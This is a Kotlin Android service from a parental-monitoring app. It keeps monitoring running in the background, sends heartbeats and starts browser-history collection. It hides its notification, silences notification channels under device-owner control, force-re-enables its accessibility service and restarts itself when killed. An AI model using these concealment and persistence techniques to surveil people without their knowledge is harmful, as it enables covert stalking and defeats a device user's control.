package com.familyguardpro.services

import android.app.Notification
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.os.PowerManager
import android.util.Log
import androidx.core.app.NotificationCompat
import com.familyguardpro.FamilyGuardApp
import com.familyguardpro.MiuiSetupActivity
import com.familyguardpro.R
import com.familyguardpro.utils.AccessibilityMonitor
import com.familyguardpro.utils.DeviceUtils
import com.familyguardpro.utils.FcmTokenManager
import com.familyguardpro.utils.PreferenceManager
import kotlinx.coroutines.*

/**
 * Persistent Foreground Service
 * 
 * In the AirDroid-style architecture, this is a SECONDARY service.
 * The PRIMARY is AccessibilityService which starts this.
 * 
 * This service:
 * - Shows a minimal/hidden notification (MIUI friendly)
 * - Holds a partial wake lock to prevent dozing
 * - Cross-monitors AccessibilityService (restarts if dead)
 * - Triggers periodic data sync
 */
class PersistentService : Service() {

    companion object {
        private const val TAG = "PersistentService"
        private const val NOTIFICATION_ID = 1001
        private const val WAKELOCK_TAG = "FamilyGuard:PersistentWakeLock"
        
        /**
         * Static flag indicating if service is running
         * Used by AccessibilityService for cross-monitoring
         */
        @Volatile
        var isRunning = false
            private set
        
        fun start(context: Context) {
            val intent = Intent(context, PersistentService::class.java).apply {
                action = ACTION_START
            }
            try {
                context.startForegroundService(intent)
            } catch (e: Exception) {
                Log.e(TAG, "Failed to start persistent service", e)
            }
        }
        
        fun stop(context: Context) {
            val intent = Intent(context, PersistentService::class.java).apply {
                action = ACTION_STOP
            }
            context.startService(intent)
        }
        
        private const val ACTION_START = "START"
        private const val ACTION_STOP = "STOP"
    }

    private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private lateinit var preferenceManager: PreferenceManager
    private var wakeLock: PowerManager.WakeLock? = null
    private var heartbeatJob: Job? = null
    private val handler = Handler(Looper.getMainLooper())
    private var crossMonitorRunnable: Runnable? = null

    override fun onCreate() {
        super.onCreate()
        isRunning = true
        preferenceManager = PreferenceManager(this)
        Log.d(TAG, "PersistentService created (SECONDARY service)")
        
        // CRITICAL: Call startForeground() IMMEDIATELY to avoid
        // ForegroundServiceDidNotStartInTimeException crash
        // Android requires this within 5 seconds of startForegroundService()
        showForegroundNotification()
        
        // MIUI/Manufacturer detection logging
        if (DeviceUtils.needsSpecialBackgroundHandling()) {
            Log.w(TAG, "=== DEVICE REQUIRES SPECIAL HANDLING ===")
            Log.w(TAG, "Device: ${DeviceUtils.getDeviceInfo()}")
            
            if (DeviceUtils.isMiui()) {
                Log.w(TAG, "Running on MIUI ${DeviceUtils.getMiuiVersion()}")
                val setupNeeded = MiuiSetupActivity.isSetupNeeded(this)
                if (setupNeeded) {
                    Log.e(TAG, "⚠️ MIUI SETUP NOT COMPLETED - Service may be killed by system!")
                } else {
                    Log.i(TAG, "✓ MIUI setup was completed")
                }
            }
        }
        
        // Start cross-monitoring the AccessibilityService (CORE)
        startCrossMonitoring()
    }
    
    /**
     * Show foreground notification immediately to satisfy Android's requirement
     */
    private fun showForegroundNotification() {
        val notification = NotificationCompat.Builder(this, FamilyGuardApp.NOTIFICATION_CHANNEL_PERSISTENT)
            .setContentTitle("") // Empty title to minimize visibility
            .setContentText("") // Empty text
            .setSmallIcon(R.drawable.ic_system_service_notification)
            .setPriority(NotificationCompat.PRIORITY_MIN) // Lowest priority
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .setOngoing(true)
            .setShowWhen(false)
            .setSilent(true)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET) // Hidden from lock screen
            .build()

        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            startForeground(NOTIFICATION_ID, notification,
                android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
        } else {
            startForeground(NOTIFICATION_ID, notification)
        }
        Log.d(TAG, "Foreground notification shown immediately")
        
        // Suppress notification in Device Owner mode
        com.familyguardpro.utils.NotificationUtils.suppressForegroundNotificationIfDeviceOwner(
            this, NOTIFICATION_ID
        )
    }
    
    /**
     * Suppress all FamilyGuard notifications when running as Device Owner.
     * This removes the foreground notification from the shade after Android registers it.
     */
    private fun suppressNotificationsIfDeviceOwner() {
        try {
            val doManager = com.familyguardpro.deviceowner.DeviceOwnerManager.getInstance(this)
            if (doManager.isDeviceOwner()) {
                Log.d(TAG, "Device Owner active — suppressing all notification channels")
                val nm = getSystemService(android.app.NotificationManager::class.java)
                
                // Approach: Re-create channels with IMPORTANCE_NONE instead of deleting
                // (cannot delete a channel while a foreground service uses it)
                val channelIds = listOf(
                    FamilyGuardApp.CHANNEL_ID_FOREGROUND,
                    FamilyGuardApp.CHANNEL_ID_STREAM,
                    FamilyGuardApp.CHANNEL_ID_SYNC,
                    FamilyGuardApp.CHANNEL_ID_CALL,
                    FamilyGuardApp.CHANNEL_ID_PERSISTENT,
                    FamilyGuardApp.CHANNEL_ID_URGENT
                )
                for (channelId in channelIds) {
                    try {
                        val existing = nm.getNotificationChannel(channelId)
                        if (existing != null && existing.importance != android.app.NotificationManager.IMPORTANCE_NONE) {
                            nm.deleteNotificationChannel(channelId)
                            val silent = android.app.NotificationChannel(
                                channelId,
                                existing.name,
                                android.app.NotificationManager.IMPORTANCE_NONE
                            ).apply {
                                description = existing.description
                                setShowBadge(false)
                                enableLights(false)
                                enableVibration(false)
                                setSound(null, null)
                                lockscreenVisibility = android.app.Notification.VISIBILITY_SECRET
                            }
                            nm.createNotificationChannel(silent)
                            Log.d(TAG, "Suppressed channel: $channelId")
                        }
                    } catch (e: Exception) {
                        // Channel may be in use by a foreground service — skip it
                        Log.d(TAG, "Skipping channel $channelId (in use): ${e.message}")
                    }
                }
                
                // For the persistent/foreground channel: detach from shade and cancel
                android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                    try {
                        stopForeground(STOP_FOREGROUND_DETACH)
                        nm.cancel(NOTIFICATION_ID)
                        Log.d(TAG, "Foreground notification removed from shade (DO mode)")
                    } catch (e: Exception) {
                        Log.w(TAG, "Could not remove notification: ${e.message}")
                    }
                }, 1000)
            }
        } catch (e: Exception) {
            Log.w(TAG, "Error suppressing notifications: ${e.message}")
        }
    }

    /**
     * Cross-monitoring: PersistentService monitors AccessibilityService
     * If AccessibilityService dies, we can't restart it programmatically
     * (it requires user to enable it in settings), but we can:
     * 1. Log the problem
     * 2. Notify the user
     * 3. Keep other services running
     * 
     * Also monitors WebSocketSyncService and restarts if dead
     */
    private fun startCrossMonitoring() {
        // Start accessibility settings monitor (ContentObserver)
        AccessibilityMonitor.startMonitoring(this)
        
        // Also start DO monitor if device owner mode
        try {
            com.familyguardpro.deviceowner.DOAccessibilityMonitor.startMonitoring(this)
        } catch (e: Exception) {
            Log.d(TAG, "DO Monitor not applicable: ${e.message}")
        }
        
        crossMonitorRunnable = object : Runnable {
            override fun run() {
                // Monitor AccessibilityService using AccessibilityMonitor
                val accessibilityEnabled = AccessibilityMonitor.isAccessibilityEnabled(this@PersistentService)
                if (!accessibilityEnabled) {
                    Log.e(TAG, "CROSS-MONITOR: Accessibility is DISABLED!")
                    
                    // Try DO recovery first if available
                    try {
                        val doManager = com.familyguardpro.deviceowner.DeviceOwnerManager.getInstance(this@PersistentService)
                        if (doManager.isDeviceOwner()) {
                            Log.d(TAG, "CROSS-MONITOR: Attempting DO force-enable accessibility")
                            doManager.forceEnableAccessibility()
                        }
                    } catch (e: Exception) {
                        Log.e(TAG, "CROSS-MONITOR: DO recovery failed", e)
                    }
                    
                    // Show persistent notification to re-enable
                    AccessibilityMonitor.checkAndNotify(this@PersistentService)
                    // Schedule AlarmManager to check if user re-enabled it
                    AlarmManagerWatchdog.scheduleAccessibilityCheck(this@PersistentService)
                } else if (!FamilyGuardAccessibilityService.isRunning()) {
                    Log.e(TAG, "CROSS-MONITOR: AccessibilityService enabled but not running!")
                    // This shouldn't happen normally - service crashed after being enabled
                    AccessibilityMonitor.checkAndNotify(this@PersistentService)
                } else {
                    Log.d(TAG, "CROSS-MONITOR: AccessibilityService is alive and enabled")
                }
                
                // Monitor WebSocketSyncService - restart if dead
                if (!WebSocketSyncService.isRunning()) {
                    Log.w(TAG, "CROSS-MONITOR: WebSocketSyncService is DEAD! Restarting...")
                    WebSocketSyncService.start(this@PersistentService)
                } else {
                    Log.d(TAG, "CROSS-MONITOR: WebSocketSyncService is alive")
                }
                // Check every 30 seconds (more aggressive monitoring)
                handler.postDelayed(this, 30_000)
            }
        }
        handler.postDelayed(crossMonitorRunnable!!, 15_000) // First check after 15 seconds
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) {
            ACTION_STOP -> {
                Log.d(TAG, "Stopping persistent service")
                stopService()
                return START_NOT_STICKY
            }
            else -> {
                Log.d(TAG, "Starting persistent service")
                startForegroundService()
            }
        }
        
        // START_STICKY ensures the service restarts if killed
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        Log.e(TAG, "PersistentService destroyed - triggering recovery")
        isRunning = false
        
        // Stop cross-monitoring
        crossMonitorRunnable?.let { handler.removeCallbacks(it) }
        
        // Stop accessibility monitoring (but don't dismiss notification - keep warning user)
        AccessibilityMonitor.stopMonitoring(this)
        
        heartbeatJob?.cancel()
        releaseWakeLock()
        serviceScope.cancel()
        
        // Restart service if in child mode (unless explicitly stopped)
        if (preferenceManager.isChildMode() && preferenceManager.isSetupComplete()) {
            // Use AlarmManager for reliable restart on MIUI
            AlarmManagerWatchdog.scheduleImmediateCheck(this, 500) // Check in 500ms
            
            // Also try direct restart
            val restartIntent = Intent(this, PersistentService::class.java).apply {
                action = ACTION_START
            }
            try {
                startForegroundService(restartIntent)
            } catch (e: Exception) {
                Log.e(TAG, "Failed to restart service directly: ${e.message}")
            }
        }
        
        super.onDestroy()
    }

    private fun startForegroundService() {
        // Only run in child mode
        if (!preferenceManager.isChildMode()) {
            Log.d(TAG, "Not in child mode, stopping service gracefully")
            // stopForeground() before stopSelf() to properly clean up
            stopForeground(STOP_FOREGROUND_REMOVE)
            stopSelf()
            return
        }

        // Foreground notification already shown in onCreate()
        // Just start the background work here

        // Refresh FCM token on service start to ensure connectivity
        FcmTokenManager.refreshTokenAsync()

        // Acquire wake lock
        acquireWakeLock()

        // Start heartbeat/sync job
        startHeartbeat()
        
        // Schedule periodic sync worker
        DataSyncWorker.schedulePeriodicSync(this)
        
        // Start WebSocket for REAL-TIME sync - THIS IS CRITICAL
        // If WebSocket is not running, start it
        if (!WebSocketSyncService.isRunning()) {
            Log.d(TAG, "WebSocketSyncService not running - starting it")
            WebSocketSyncService.start(this)
        } else {
            Log.d(TAG, "WebSocketSyncService already running")
        }
        
        // Start browser history monitoring
        try {
            val browserIntent = Intent(this, BrowserHistoryService::class.java)
            startService(browserIntent)
            Log.d(TAG, "Browser history service started")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to start browser history service", e)
        }
        
        Log.d(TAG, "Persistent service started successfully")
    }

    /**
     * PERFORMANCE FIX: Use temporary wake lock (10 seconds) instead of 10 hours!
     * This reduces battery drain by ~70%
     */
    private fun acquireWakeLock() {
        try {
            // Release existing wake lock if held
            wakeLock?.let {
                if (it.isHeld) {
                    it.release()
                }
            }
            
            val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
            wakeLock = powerManager.newWakeLock(
                PowerManager.PARTIAL_WAKE_LOCK,
                WAKELOCK_TAG
            ).apply {
                setReferenceCounted(false)
                acquire(10_000L) // 10 seconds - auto releases!
            }
            Log.d(TAG, "Temporary wake lock acquired (10 seconds)")
        } catch (e: Exception) {
            Log.e(TAG, "Error acquiring wake lock", e)
        }
    }

    private fun releaseWakeLock() {
        wakeLock?.let {
            if (it.isHeld) {
                it.release()
                Log.d(TAG, "Wake lock released")
            }
        }
        wakeLock = null
    }

    private fun startHeartbeat() {
        heartbeatJob?.cancel()
        heartbeatJob = serviceScope.launch {
            // Send first heartbeat immediately to mark device as online
            try {
                sendHttpHeartbeat()
                Log.d(TAG, "Initial heartbeat sent")
            } catch (e: Exception) {
                Log.e(TAG, "Initial heartbeat failed", e)
            }
            
            var heartbeatCount = 0
            
            while (isActive) {
                try {
                    // Wait 2 minutes between heartbeats
                    delay(2 * 60 * 1000L)
                    heartbeatCount++
                    
                    // Trigger immediate sync
                    DataSyncWorker.runImmediateSync(this@PersistentService)
                    
                    // Also send HTTP heartbeat to update online status (WebSocket fallback)
                    sendHttpHeartbeat()
                    
                    // Refresh FCM token every 15 minutes (every 8th heartbeat)
                    // This ensures token stays valid even when app is never opened
                    if (heartbeatCount % 8 == 0) {
                        Log.d(TAG, "Heartbeat: Refreshing FCM token (every 15 min)")
                        FcmTokenManager.refreshTokenAsync()
                    }
                    
                    // Check and restart WebSocket if dead
                    if (!WebSocketSyncService.isRunning()) {
                        Log.w(TAG, "Heartbeat: WebSocketSyncService dead - restarting")
                        WebSocketSyncService.start(this@PersistentService)
                    }
                    
                    Log.d(TAG, "Heartbeat sent (count: $heartbeatCount)")
                } catch (e: Exception) {
                    Log.e(TAG, "Heartbeat error", e)
                }
            }
        }
    }
    
    /**
     * Send HTTP heartbeat to update device online status
     * This is a fallback when WebSocket connection fails
     */
    private suspend fun sendHttpHeartbeat() {
        try {
            val deviceId = preferenceManager.getDeviceId() ?: return
            val batteryLevel = getBatteryLevel()
            
            withContext(Dispatchers.IO) {
                try {
                    val url = java.net.URL("${FamilyGuardApp.BASE_URL}api/devices/$deviceId/heartbeat")
                    val connection = url.openConnection() as java.net.HttpURLConnection
                    connection.requestMethod = "POST"
                    connection.setRequestProperty("Content-Type", "application/json")
                    connection.setRequestProperty("X-Device-ID", deviceId)
                    connection.doOutput = true
                    connection.connectTimeout = 10000
                    connection.readTimeout = 10000
                    
                    val body = org.json.JSONObject().apply {
                        put("deviceId", deviceId)
                        put("battery", batteryLevel)
                        put("timestamp", System.currentTimeMillis())
                    }
                    
                    connection.outputStream.use { os ->
                        os.write(body.toString().toByteArray())
                    }
                    
                    val responseCode = connection.responseCode
                    if (responseCode == 200) {
                        Log.d(TAG, "HTTP heartbeat sent successfully")
                    } else {
                        Log.w(TAG, "HTTP heartbeat failed: $responseCode")
                    }
                    connection.disconnect()
                } catch (e: Exception) {
                    Log.e(TAG, "HTTP heartbeat error: ${e.message}")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "sendHttpHeartbeat error", e)
        }
    }
    
    private fun getBatteryLevel(): Int {
        return try {
            val batteryManager = getSystemService(Context.BATTERY_SERVICE) as android.os.BatteryManager
            batteryManager.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY)
        } catch (e: Exception) {
            -1
        }
    }

    private fun stopService() {
        heartbeatJob?.cancel()
        releaseWakeLock()
        stopForeground(STOP_FOREGROUND_REMOVE)
        stopSelf()
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        super.onTaskRemoved(rootIntent)
        Log.d(TAG, "Task removed, restarting service")
        
        // Restart service when app is swiped away
        if (preferenceManager.isChildMode() && preferenceManager.isSetupComplete()) {
            val restartIntent = Intent(this, PersistentService::class.java).apply {
                action = ACTION_START
            }
            try {
                startForegroundService(restartIntent)
            } catch (e: Exception) {
                Log.e(TAG, "Failed to restart after task removed", e)
            }
        }
    }
}
